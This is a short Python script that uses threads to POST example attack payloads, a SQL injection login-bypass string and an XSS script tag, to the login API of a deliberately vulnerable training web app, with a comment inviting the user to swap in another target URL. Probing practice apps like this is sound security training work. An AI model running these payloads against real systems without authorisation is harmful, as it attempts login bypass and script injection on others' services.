# request_sender.py
import requests
from concurrent.futures import ThreadPoolExecutor

def send_request(url, data):
    response = requests.post(url, data=data)
    return response.text

def main():
    url = "https://juice-shop.herokuapp.com/api/Users/#/login"  # Replace with your target URL
    payloads = [{"email": "' OR '1'='1'; --"}, {"email": "<script>alert('XSS');</script>"}]  # Example payloads

    with ThreadPoolExecutor(max_workers=10) as executor:
        results = list(executor.map(lambda p: send_request(url, p), payloads))

    for result in results:
        print(result)

if __name__ == "__main__":
    main()
